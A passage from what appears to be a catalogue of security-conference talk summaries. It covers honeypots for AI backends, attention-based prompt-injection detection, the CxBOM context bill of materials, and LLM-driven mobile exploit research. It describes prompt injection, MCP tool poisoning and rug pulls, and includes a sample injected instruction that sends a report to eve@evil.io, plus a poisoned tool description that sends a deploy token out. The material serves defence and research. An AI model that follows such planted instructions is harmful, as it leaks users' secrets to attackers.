  • Harden exposed model backends and agents, since you may be blamed or held liable when your infrastructure is used to attack third parties.
  • Run your own honeypots to gather threat intelligence about attacks on AI systems.

Q&A

  • Q: Is the initial CVE campaign fully agentic or just scripts? A: Not known for sure; speed and metadata suggest autonomy in some cases, unclear in others.
  • Q: Did attackers try to detect that it was a honeypot? A: They did not seem to notice; the team keeps setup details under wraps and designs exposure carefully.
  • Q: Is there an endgame, or do they just exploit as much as possible? A: The trail ends at the third-party site because outbound is blocked; the data suggests they want free inference to fuel their agent setups.
  • Q: Any agent swarm behavior? A: There are indications of rogue agents or swarm activity, but it is early and was cut from the talk.
  • Q: Would you mess with the attackers? A: They already waste time several steps deep into believable infrastructure; poisoning or hack-back is a good idea to consider.
  • Q: Does the system-prompt yelling mean script kiddies, or higher sophistication? A: Prompt yelling is common in real frontier-lab system prompts too; attacker identity is unknown, so it could be a mix.
  • Q: Who is liable if your LLM is used to hack a third party? A: Possibly you; the speaker does not know the legal answer but recommends hardening, monitoring and running your own honeypots.
  • Q: What are the source IP buckets (VPS, consumer VPN, ORB networks)? A: Not known off the top; will follow up.
  • Q: Are you seeing true sources or bank shots through other victims? A: Not sure; to be looked into.
  • Q: Same actor that exploits the system and uses the key, or a market? A: IP changes between key theft and key use were common, so it could be rotated infrastructure or sold keys; an underground market is suspected but unconfirmed.
  • Q: Any other prompt types beyond pentest? A: Yes, other tasks such as adult subtitles, as people just use the free tokens; cut for time.

56 Attention Is All You Need (to Catch Hallucinations and Prompt Injections)

Saurabh Shintre (Founder and CEO, Realm Labs Inc) · talk · 25 min · Watch

●●●○○ Useful, lighter on evidence. The talk presents an attention-based taint-tracking detector with an F1 benchmark table on four datasets and a live demo; the benchmark numbers are unpublished, the method applies to open weights only, and no multi-hop data was shown.

The talk's thesis: Hallucinations and indirect prompt injections are the same failure, a model attending to the wrong thing, and both can be caught for free by reading attention traces during open-weights inference and propagating taint along strong attention links.

Prompt injection Guardrails and runtime controls Model internals Evals, benchmarks and metrics

Full breakdown: 12 claims, 12 numbers, 5 slides

Shintre opens by asking how an LLM answers a factual question. Facts in the weights, like the capital of France, need no context. Anything else, like the dates of this conference, must be looked up in the prompt at generation time, and that lookup runs through attention. He argues that the model cannot store a specific fact or instruction permanently, so it must look back at the source span each time it emits one, and that look-back survives translation and multi-hop reasoning. He frames hallucination as the model not attending to any context (the Air Canada chatbot inventing a policy) and indirect prompt injection as the model attending to an untrusted source it should ignore (EchoLeak, a zero-click attack on Microsoft Copilot). The method, which the slides call TaintTrace, seeds taint on source spans, then for each new token finds the earlier tokens it attends to above a threshold, passes taint only along those links, repeats until the answer or tool call is reached, and decides whether the output inherited taint. He shows a benchmark table with F1 gains over prior attribution methods on two injection datasets and two grounding datasets, then a live demo of Realm Labs' RealmGuard playground: a grounded Eiffel Tower answer, an ungrounded one, an altered context, and a send_money tool call whose recipient is traced to the trusted source rather than an injected one. The method needs no extra LLM call and works only with open weights.

What to do with it (this breakdown's reading)

  • If you self-host open-weights models in an agent, ask whether your inference stack can expose attention traces and use them as a detector that adds no model calls.
  • Treat tool-call arguments as the enforcement point, attribute each argument to its source span and gate on provenance, not on whether the text looks malicious.
  • Build a source-trust labeling step now (which tools return untrusted data), since the method depends on it and it is useful for any taint approach.
  • Do not rely on this for hosted closed-weights models or for direct prompt injection; keep other controls for those cases.
  • Ask vendors for multi-hop injection results, since the public benchmarks shown are mostly single hop.

How far the evidence goes

This breakdown's assessment

  • The results table was produced by the presenting company for its own method on four datasets, and the paper was not yet published, so the numbers could not be checked from the recording; F1 on OfficeQA-full is 0.47.
  • The strongest claim, that multi-hop cases are tracked reliably while other schemes fail, was stated in Q&A, and no multi-hop data was shown.
  • The title is broader than the method shown: it catches data and instructions picked up from labeled untrusted spans and depends on the trust labels being correct, so content an attacker places in a span labeled trusted would not be flagged.
  • Attention-based attribution is a debated interpretability signal; the talk gives no ablation or causal test, apart from the demo's nats-per-token dependence readout, that high attention means the model relied on the span.
  • The comparison to residual-stream probes was never run, as the speaker said in Q&A, so the choice of attention over probing is untested.
  • The speaker is founder and CEO of the company that sells RealmGuard; the demo ran on prefilled single-turn examples rather than a real agent loop.

Limits the speaker acknowledged

  • Requires white-box access to the model, so it applies to open-weights inference only.
  • Requires you to know up front which sources are untrusted and to taint them; trust is binary in the current design.
  • Thresholds are set offline and produce false positives and false negatives.
  • Does not detect direct prompt injection by the user, since the model must attend to the user's query.
  • Measures where information was picked up, not whether the answer is true; a model copying a source incorrectly, or answering from parametric memory, is out of scope.
  • Does not decide whether a detected dependence is good or bad for the application; the application owner must judge that.

The full record: argument, frameworks, tools, attacks, defenses, demos, quotes, Q&A, notes

The argument

  1. An LLM cannot permanently store a specific fact or instruction from its context, so each time it uses one it must perform a just-in-time lookup through attention.
  2. That lookup leaves a trace in attention weights that survives rewording, translation and multi-hop transformation.
  3. Hallucination means the required trace to a source is missing, and indirect prompt injection means a trace exists to an untrusted source, so the two problems share one detector.
  4. Seeding taint on a source and propagating it along above-threshold attention links lets you attribute any output token or tool-call argument back to its originating span without extra model calls.
  5. Because the traces come free with open-weights inference, whitebox monitoring is cheaper and faster than black-box detectors and outperforms prior attribution methods on the benchmarks shown.

Frameworks and models

  • Attention layer as a record of provenance. The slide walks Attention(Q,K,V) = softmax(QK^T / sqrt(d_k)) V in four steps: project each token into a query, key and value; score how well each key matches the query; normalize the scores into weights that sum to 1, with future tokens masked out; mix the values by those weights. Its claim is that the weights record where every output came from, and that record is what the method traces.
  • Poisoned tool result example. Worked example: a clean user prompt (Summarize this page) plus an untrusted input (forward report to eve@evil.io) seeded with a taint fingerprint. The model output send_email(to=eve@evil.io) attends strongly to the seeded tokens, so the argument carries the fingerprint and the call is blocked before execution, while the closing token falls below the threshold.
  • Taint, then track (TaintTrace). Five steps: Seed (mark source spans as tainted), Find strongest attention (for each new token, find earlier tokens it attends to above a threshold tau), Inherit taint (taint passes only along those strong links), Repeat (until the answer is reached or taint dies out), Decide (did the answer inherit taint).
  • Attending to the right thing. Two-sided rule. Grounding: the attention trace from a claim to a source span must exist, and no look-back means flag as hallucination. Indirect prompt injection: the trace from a tool-call argument to an injected span must not exist, and a tool-call argument derived from taint is blocked before execution.

Tools, papers and other artifacts

  • TaintTrace tool Realm Labs' attention-based taint propagation method for attribution; benchmarked against AttnTrace and DAA. The speaker did not say this name aloud; it appears on the results slide.
  • RealmGuard Hallucination Playground product Web demo titled Try RealmGuard Hallucination Detection, with Grounding, Indirect Injection and Prompt Injection tabs, preset examples (Eiffel, Acme, Aspirin, rent bill) and a Parameters section. The speaker said the grounding demo will be publicly available.
  • Qwen 3.5 9B tool Open-weights model on which the demo slide says attention was computed, with the multi-hop conversations generated by an Anthropic Claude model.
  • BIPIA benchmark Indirect prompt injection dataset used in the results table.
  • AgentDyn benchmark Indirect prompt injection dataset used in the results table.
  • MTRAG benchmark Grounding benchmark (spoken as MT rag).
  • OfficeQA-full benchmark Grounding benchmark; the speaker called it one of the really hard ones.
  • AttnTrace and DAA (Direct Average Attribution) paper Prior attribution methods used as baselines.
  • Realm Labs paper on arXiv paper The speaker said the paper is going to be on arXiv soon; not yet cited.

Attacks and failure modes

  • Indirect prompt injection: instructions planted in an untrusted email, web page or tool result get picked up by the model and acted on, for example forwarding a report to an attacker address or paying a different account (EchoLeak cited as the example).
  • Multi-hop evasion: an injected instruction or value is transformed, for example base64 encoded, across steps so that surface-matching detectors lose it.
  • Ungrounded answers: the chatbot invents a policy not in its sources (Air Canada example).

Defenses and controls

  • Run open-weights inference with attention traces exposed, and seed taint on spans from untrusted sources (external-domain email, web search results, tool outputs).
  • Propagate taint only along above-threshold attention links and check tool-call arguments and final responses for inherited taint; block the tool call before execution if its arguments derive from tainted spans.
  • For grounding, flag any factual claim that has no attention look-back to a source span.
  • Tune the attention threshold offline per setting and accept the false-positive and false-negative tradeoff that implies.
  • Label sources trusted or untrusted using deterministic knowledge of which tools return untrusted data (such as external-domain mail) and named-entity recognition to taint context before it enters the system.
  • Extend the same check to instructions: an instruction picked from an untrusted source is a problem even if not malicious.

Demos

  • Grounding demo on the playground: Eiffel Tower context, question and response with matching facts; tokens shown as grounded in the context.
  • Altering the context (a different completion year and height, and later a changed date) so the model's response no longer matches the context; the attention trace breaks even where the model's answer is factually right.
  • Indirect injection demo: a bill-payment agent given a trusted bill and an untrusted email carrying an attacker account number; with the correct account the tool call traces to the trusted source, and with the attacker's account substituted the tokens trace to the untrusted source.

Q&A

  • How do you define a trusted source when it is a third-party system? Answer: you must first decide what to taint; this is a limitation but easier than it sounds, because you know which tools return untrusted data (external-domain email) and can use named-entity recognition to taint context before it enters the system.
  • How is the weight of propagated taint decided? Answer: thresholds are computed offline for the setting, as with any ML detector, trading false positives against false negatives; the source (tool call, response) does not matter because everything flows through the model.
  • What about answers that mix context and pretraining knowledge? Answer: if the model uses its own memory it will not attend to context, so the check does not decide truth, only whether the model had to look the information up.
  • Why attention rather than the residual stream and probes? Answer: not compared; the team targets grounding (where information was picked up), not truthfulness, and found attention better for tracking pickup.
  • Has trust been modeled as a scale rather than binary? Answer: no; many trust questions are unanswered here; the system does not work for direct prompt injection because the model must attend to the user's query.
  • Does the attention roll-up need to be obvious for an injection that triggers an action? Answer: the scheme handles multi-step cases such as base64 conversion of the original information; benchmarks were mostly one-hop, where other schemes also do well, and other schemes failed on multi-hop in their tests.
  • If a URL from a web search is propagated into another web call, is that an incident? Answer: it only tells you where the URL was picked up; whether that is bad depends on application context, but an instruction picked from an untrusted source is likely an injection or at least lost focus.

57 All Tokens Are Created Equal (Including the Attacker's)

Rock Lambros (Director of AI Standards and Governance, Zenity), Fred Wilmot (CEO and Co-Founder, Detecteam) · talk · 17 min · Watch

●●●○○ Useful, lighter on evidence. The talk presents a specification, an emitter and a proxy for recording and pinning what enters the context window, with the speakers' own stated caveats; the headline hypothesis is untested and the demo is scripted.

The talk's thesis: Because a transformer's attention carries no provenance for any token, the model cannot be the enforcement point for trust, so the pipeline that assembles the context window should record and enforce where every component came from; CxBOM is a CycloneDX-aligned bill of materials for the context window that does this.

MCP, tools and skills Agent memory and context Supply chain and model integrity Prompt injection

Full breakdown: 12 claims, 11 numbers, 5 slides

The speakers launch cxbom.org, a context bill of materials that records what an agent actually read in each inference. They start from EchoLeak, a zero-click exfiltration from Microsoft 365 Copilot, where attacker text arrived as retrieved content and sat in the same token sequence as the operator's instructions. The premise, which they credit to Young's token democracy idea, is that scaled dot-product attention has no field for provenance, so the context window is the attack surface. They then describe a trust model of rings: ring 0 for the operator system prompt, ring 1 for tool definitions, server instructions, tool results, retrieved documents and model output read back later, and ring 2 for the user. A ring records placement and confers no privilege inside the model. They flag trust inversion, where a third-party MCP tool definition lands in the system region next to the operator prompt and borrows its positional authority. They present a Dual-Failure Multiplier hypothesis, that untrusted tokens weighted by attention cost the operator share twice, in task quality and in safety, and say plainly that no experiment has run. Supporting related work from 2026 shows operator influence can be diluted, deleted or overridden. They place defenses at assembly, model and execution, and argue enforcement belongs outside the model. The tool has a proxy that pins signed tool definitions by SHA-256 and an emitter that writes a record per inference. A recorded demo with three attacks on a notes tool, each run with the gate off and on, shows the canary secret leaving without the gate and the proxy pulling the changed tool with it. They call it an MVP, not for production.

What to do with it (this breakdown's reading)

  • Inventory which of your agents render third-party MCP tool definitions in the system region, because that placement is the trust inversion this talk flags.
  • Require signed, hash-pinned tool definitions and refuse server launches that differ from the approved one, while remembering that a pin only detects change after approval, not poison at first sight.
  • Log what the model was actually shown per inference (component, ring, digest, token count) so incident response is not limited to inbox-side evidence.
  • Test whether your agent's compaction keeps the rules you depend on; a dropped rule is a control that silently vanished.
  • Treat the multiplier and any context-budget policy as unproven until the experiment reports, and do not adopt CxBOM in production yet.

How far the evidence goes

This breakdown's assessment

  • The published description cites attention-mass plots collapsing as an attacker floods the window and a gate that fails the session on trust inversion; the slides state the attention experiment was not run and that failing on a finding is not in slice 1.
  • The central framing, that attention has no provenance field, is correct as architecture but does not by itself show that models fail to track provenance in practice; instruction-hierarchy training is acknowledged but not evaluated here.
  • The enforcement shown has a limited scope: the proxy catches change after signing, which addresses rug pulls and tampered definitions but not the harder first-sight poisoning or ring 1 injection like EchoLeak, which is only recorded.
  • The demo uses a scripted, fixed attack against small 8B models with a canary; it shows the gate working for those three cases, and no robustness, evasion or false-positive results were shown.
  • Related-work numbers are third-party preprints presented to motivate a hypothesis; the Governance Decay figures in particular depend on that setup and should not be read as general rates.
  • The slide credits one speaker's employer with the SalesBleed finding, and the other speaker runs a company in this space; the talk launches a specification and invites contributions, and some of the incident evidence cited comes from the speakers' own organizations.
  • Value of the record for forensics is argued but not shown, with the slide itself saying forensics and cost have not been measured.

Limits the speaker acknowledged

  • The Dual-Failure Multiplier is a hypothesis with no experiment run and no results; the attack half is only a design and the quality half is not designed.
  • CxBOM is an MVP and not for production; the 1,691 passing cases show conformance, not effectiveness, and timing is an order of magnitude on one machine.
  • It does not block injection in tool results or retrieved documents, prove a definition benign, pin transitive dependencies, contain a hostile server process, fail a build on a finding, or detect a removed wrapper or new unwrapped server; gate, scan and guard are not in slice 1.
  • Poison present at first approval is not detected by the pin.
  • The demo was scripted and pre-recorded and does not show attack success rates; the speakers said getting an attack to fire was the hardest part of the build.
  • The related incident and preprint evidence is cited, with incident details unverified, and is not a test of the multiplier.

The full record: argument, frameworks, tools, attacks, defenses, demos, quotes, Q&A, notes

The argument

  1. Attention takes queries, keys and values with no field for where a token came from, so a trust distinction inside the model is at most a learned tendency.
  2. Therefore every token in the context window, including a poisoned README or an externally published MCP tool definition, is attack surface, and a property that must hold on every inference cannot rest on a tendency.
  3. Enforcement must sit in software outside the model, at assembly (what the model is shown) or at execution (what the agent may do with what it read), and assembly is where a record of provenance can be made.
  4. CxBOM records each component's trust ring, token count and SHA-256 digest per inference, and its proxy drops a tool definition or refuses a server launch if it changed after a person signed it.
  5. A signed pin proves a definition did not change after approval but not that it was clean at approval, and injection through tool results and retrieved documents is only recorded, not blocked.
  6. Whether the amount and content of ring 1 text in the window is itself a security parameter (the Dual-Failure Multiplier) is a hypothesis to be tested, with no budget policy published until it is.

Frameworks and models

  • Trust rings. Trust follows the ingestion path. Ring 0 operator: the system prompt. Ring 1 agent: tool definitions, server instructions, tool results, retrieved documents. Ring 1 derived: model output read back into later context. Ring 2 user: user turns. The operator registers each path as a ring. A ring records placement and confers no privilege inside the model.
  • Trust inversion (tool definition). A third-party MCP tool definition (ring 1) rendered in the chat template's system region beside the ring 0 operator prompt with no boundary takes the operator's positional authority. CxBOM records it as an open finding that names an architecture, not an attack.
  • Dual-Failure Multiplier (hypothesis). Operator share of attention falls as untrusted tokens accumulate, lowering task quality and safety at once; each added untrusted token weighted by the attention it attracts would cost the operator twice. The test crosses length with content (attack, neutral, benign instruction, padding) and measures attention to the operator and attack success. Status: not run, no results.
  • Diluted, deleted or overridden. Three ways operator influence is lost. Diluted: softmax crowding as context grows. Deleted: a rule dropped when history is compacted. Overridden: a small ring 1 payload takes over an agent. Length covers only the first.
  • Where defenses sit. Assembly (what the model is shown): signed tool pins and the CxBOM record, enforced. Model: attention with no provenance input, plus spotlighting, instruction hierarchy, StruQ, SecAlign, ISE and ASIDE, a learned tendency an adversary can search against. Execution (what the agent may do with what it read): CaMeL, FIDES, Progent, enforced. Neither enforced layer covers the other.
  • CxBOM. A CycloneDX 1.6-aligned (2.0 and 2.1 planned) bill of materials for one inference: each component, its trust ring, provenance, SHA-256 digest and token count, with findings such as trust inversion, tool-definition binding and missing control. Parts: spec and JSON schema, emitter, validator and fixtures, proxy, and an offline record viewer.

  • MCPoison CVE-2025-54136 and CurXecute CVE-2025-54135 cve Configuration trust failures; the proxy refuses a changed command while the wrapper stays, but does not detect a removed wrapper.
  • Copilot SearchLeak, CVE-2026-42824 cve Search-result text drove exfiltration (Jun 2026), cited as an overridden-influence incident.
  • SalesBleed and PleaseFix paper 2026 ring 1 incidents: a poisoned lead form hijacking Agentforce (Sept 2026, attributed to Zenity on the slide), and hidden page text hijacking AI browser agents (Aug 2026).
  • Governance Decay (arXiv 2606.22528), SafeEnd (arXiv 2605.08277), Liu 2026 (arXiv 2605.05716) paper Cited preprints on rules dropped by compaction, a theory of drift being representational, and quality loss from adding benign agent components.
  • Token Democracy (Young, 2025) paper Source of the premise that all tokens are treated equally by attention.
  • Invariant Labs tool poisoning and rug pull disclosure paper Cited as the origin of the tool-definition trust inversion failure class.

Attacks and failure modes

  • Tool poisoning: hidden instructions in an MCP tool description (here a notes tool) that tell the model to call another tool and send a secret out before doing its task.
  • MCP rug pull: a tool definition lists clean at approval, then the server rewrites it mid-session with a change notice and the model follows the new text.
  • Trust inversion: a third-party tool definition placed in the operator's system region inherits ring 0 positional authority.
  • Indirect injection through ring 1 content such as retrieved documents, poisoned lead forms (SalesBleed), hidden page text (PleaseFix) and search results (Copilot SearchLeak), with EchoLeak as the zero-click exfiltration case.
  • Governance decay: compaction drops a rule from the history summary, so the agent stops obeying it; dilution as untrusted content crowds the operator's attention share.

Defenses and controls

  • Have a person review each MCP tool definition and sign it, pin it by SHA-256, and put the proxy between client and stdio server so a changed definition is dropped and a changed launch is refused.
  • Emit a per-inference record of every component with its trust ring, provenance, token count and digest, so that incidents can be reconstructed from what the model actually saw.
  • Register each ingestion path as a ring (operator, agent, user) and treat any third-party tool definition rendered in the system region as an open trust-inversion finding.
  • Enforce provenance at assembly and execution (signed pins, CaMeL, FIDES, Progent style controls) and keep in-model defenses as an additional layer for what assembly cannot see.
  • Check that rules which must hold survive history compaction, since a rule dropped from the summary produced 38% violations in the cited work.
  • Track tokens per ring as a metric; the speakers say a budget policy will follow only after their experiment.

Demos

  • Pre-recorded demo (the speaker joked about the demo gods) with a defender window, an attacker window posing as an inbox, and a CxBOM dashboard; captions say each attack hides in the description of a notes tool, the model believes it and sends a canary secret through a normal fetch call.
  • Attack one: an appended sentence tells the model to send the secret out before it searches the notes. Gate off: the canary reached the attacker inbox. Gate on: the search_notes tool whose hash changed since approval was dropped from the listing and nothing arrived.
  • Attack two: the notes tool is described as sharing a login with another service, and the search is said to fail until the secret goes out; gate off again exfiltrates, and the trust inversion stays open on the fetch tool even when the gate is on.
  • Attack three: an MCP rug pull in which the tool lists clean, then the server rewrites its description mid-session and sends a change notice; gate off, the model follows the new text and sends the secret before searching the notes; gate on, the refresh does not match the pin and the proxy pulls the tool.

On the slides, not said aloud

  • Incident table: tool poisoning and rug pull (Invariant Labs) as tool-definition trust inversion, where the proxy drops a definition that changed after signing but does not detect poison at first sight; MCPoison CVE-2025-54136 and CurXecute CVE-2025-54135 as configuration trust failure, where a changed command is refused while the wrapper stays but a removed wrapper is not detected; EchoLeak as context injection through ring 1, not gated and recorded as unverified ring 1.
  • Dual-Failure Multiplier slide status table: attack half design approved, not yet frozen or registered, no trial run; quality half not yet designed; context budgets: CxBOM records tokens per ring with no budget policy until the experiment reports. Sources cited for the two bodies of work: Context Rot, Lost in the Middle, LongMemEval, many-shot jailbreaking; neither has measured both failures in the same runs.
  • Content slide detail: Shapley confidence interval below zero for the planning component; gap narrows at 70B and is near 0% on Claude Haiku 4.5; governance decay channel results (system message no decay, user, memory and tool-delivered rules +33 to +50); SafeEnd says drift may be representational and attention share was not measured; footnote that incident details are unverified press and vendor reports.
  • What this version does not do: block injection in tool results or retrieved documents (recorded as unverified ring 1); prove a definition is benign; pin transitive dependencies or contain a hostile server process running as the user; fail a build on an open finding (needs cxbom gate, not in slice 1); detect a removed wrapper or a new unwrapped server (scan and guard, not in slice 1); measure effectiveness, forensics or cost, and the Dual-Failure Multiplier experiment has not run.
  • Demo dashboard fields: per-inference record with ring and share per component (cc-1 to cc-6), gateState, inversionDetected, findingsOpen, an attestation log (proxy session opened: enforce, protocol era latched, server identity checked: pinned-match, verdict recorded), and finding types trust-inversion (high), tool-definition-binding (medium), missing-control (low), tool-definition-blocked (low, mitigated).
  • Demo attack text in the attacker window: a rewritten search_notes description reading as a required setup step that tells the model to call fetch with a collection URL on an inbox.test host followed by the deploy token before any other call; attack three's diff adds that the notes tool shares an authenticated session with deploy and errors until the fetch completes.
  • Defender window showed hash change on the swapped tool from e600ce6ead94 to 4b51c76b1732 and the gate decision 'block' with serverChecksumVerified=false.
  • Closing slide lists Specification, JSON Schema 0.3.0, Field reference, Example records and Offline record viewer, tagged [un]prompted 2026 Stage 2.

58 0-Click Remote Exploits in an AI World

Anna Groza (Calif.io (Security Researcher)), Bruce Dang (Calif.io) · talk · 23 min · Watch

●●●●○ Specific and well evidenced. The talk shows demonstrations of agent-driven research finding bugs in messaging apps and producing an iOS exploit in about three hours; the evidence shown is a few case studies and no aggregate data.

The talk's thesis: LLM agents can now find and, with a strong enough starting point, weaponize remotely reachable bugs in messaging apps at a cost of under five figures in API fees, so the trusted-contact gating that messaging apps rely on is no longer a dependable boundary.

Vulnerability discovery and exploitation Autonomous offense AppSec and secure development Threats seen in the wild

Full breakdown: 11 claims, 7 numbers, 5 slides

Anna Groza of Calif.io opened by saying the talk is not the one originally proposed. The plan was to use LLM agents to enumerate and audit the remotely reachable attack surface of mobile messaging apps, combining static analysis with a lightweight man-in-the-middle setup that lets an agent alter messages between two phones and watch what the receiving client does. Results on large messaging apps came out far better than expected, so the talk became a tour of what that produced. She first gave background: the 2019 Group FaceTime logic bug, Natalie Silvanovich's 2021 state-machine survey of calling stacks, and a 2025 Project Zero report on WhatsApp contact gating. Then three findings. The first was a flaw in a legacy WeChat calling stack that the agents found, which the team turned into a proof-of-concept worm demo called WeWorm; she said it was found with a frontier model and a $200 subscription, in an app with about 1.5 billion users. The second was a Samsung parser bug paired with a WhatsApp 0-click path from a trusted contact, with the details redacted, a fix that turned out to be incomplete, and cooperation from Meta's product security team. The third was an AI-assisted exploit for an iOS graphics bug recently exploited in the wild, which she said an unreleased OpenAI cyber model produced in roughly three hours from a short prompt, even with Apple's newest memory and pointer protections on.

What to do with it (this breakdown's reading)

  • Budget for attackers who can pay under five figures in API fees for a working mobile exploit, and revisit any threat model that assumes such exploits are rare.
  • Treat trusted-contact or contact-gating checks as a convenience control, not a security boundary, in any messaging or collaboration product you build or buy.
  • Fund broader sandboxing of file and media parsing (separate process, reduced privileges) because logic gaps in gating will keep appearing.
  • Run the same kind of agent-driven reachability audit on your own apps: a message-tampering harness plus static analysis is cheap enough to try.
  • Plan for compressed patch-to-exploit timelines when a bug is already known in the wild, because a model may rebuild a stronger exploit within hours.

How far the evidence goes

This breakdown's assessment

  • The headline results rest on a small number of case studies, with no hit rate, false-positive rate or total spend across the audited apps shown, so the claim that this scales is stated rather than measured.
  • Cost figures such as 'under five figures' and a $200 subscription are speaker estimates with no cost table shown, and the talk does not say whether they include researcher time spent steering the agents and building the harness.
  • The iOS result starts from a bug that was already publicly exploited and written up by the team, so it shows strong exploit development from a known primitive, not autonomous discovery.
  • The comparison with the in-the-wild sample rests on public reporting that it needed mitigations disabled, and no independent verification was shown.
  • The Lockdown Mode answer was not quantified, and the closing social-graph point is a hypothesis, not a finding.
  • The model is referred to by a name that is partly garbled in the transcript and by an unreleased model label on a slide, so readers cannot reproduce or independently evaluate it.

Limits the speaker acknowledged

  • The speaker said the Samsung exploit needed substantial human guidance and steering.
  • Some details are withheld pending vendor fixes: the Samsung component and CVE are redacted, and the full iOS exploit details are reserved for a future conference.
  • The observation that models do better under strong mitigations comes from very brief experiments with one strong primitive.
  • The speaker said the model's output was so surprising that she first believed it was fake and verified it by repeated testing across boots.
